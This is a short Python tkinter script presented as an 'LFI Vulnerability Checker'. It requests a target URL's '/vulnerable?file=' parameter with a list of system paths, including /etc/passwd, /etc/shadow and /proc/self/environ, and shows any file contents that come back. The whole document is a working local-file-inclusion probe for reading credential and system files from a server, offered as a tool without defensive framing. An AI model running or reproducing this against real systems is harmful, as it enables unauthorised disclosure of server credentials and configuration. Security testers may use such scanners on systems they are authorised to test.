import tkinter as tk
from tkinter import messagebox
import requests

def check_lfi_vulnerability(url, file_paths):
    vulnerable_files = []

    for file_path in file_paths:
        full_url = f"{url}/vulnerable?file={file_path}"  # Adjust the payload as needed

        response = requests.get(full_url)

        if "root:" in response.text:
            vulnerable_files.append((file_path, response.text))  # Store the vulnerable file path and content

    return vulnerable_files

def check_vulnerabilities():
    target_url = url_entry.get().strip()
    
    # Check if the URL is valid
    if not target_url.startswith(('http://', 'https://')):
        messagebox.showerror("Invalid URL", "Please enter a valid URL starting with http:// or https://")
        return

    vulnerabilities = check_lfi_vulnerability(target_url, local_files_to_check)

    if vulnerabilities:
        # Display vulnerabilities horizontally
        vulnerabilities_text.delete(1.0, tk.END)
        vulnerabilities_text.insert(tk.END, "LFI Vulnerabilities Found!\n")
        for file_path, content in vulnerabilities:
            vulnerabilities_text.insert(tk.END, f"File: {file_path}\nContent: {content}\n\n")
    else:
        vulnerabilities_text.delete(1.0, tk.END)
        vulnerabilities_text.insert(tk.END, "No LFI Vulnerabilities Found.")

# Create the main window
root = tk.Tk()
root.title("LFI Vulnerability Checker")

# Create input fields
tk.Label(root, text="Enter the target URL:").pack()
url_entry = tk.Entry(root, width=50)
url_entry.pack()
url_entry.insert(0, "http://example.com")  # Default URL

# Button to check vulnerabilities
check_button = tk.Button(root, text="Check Vulnerabilities", command=check_vulnerabilities)
check_button.pack()

# Text widget to display vulnerabilities
vulnerabilities_text = tk.Text(root, height=10, width=80)
vulnerabilities_text.pack()

# List of local files to check
local_files_to_check = [
    "/etc/passwd",
    "/etc/hosts",
    "/etc/shadow",
    "/etc/group",
    "/etc/issue",
    "/etc/hostname",
    "/proc/self/environ",
    "/proc/version",
    "/proc/cmdline",
    "/proc/mounts"
]

# Run the GUI
root.mainloop()

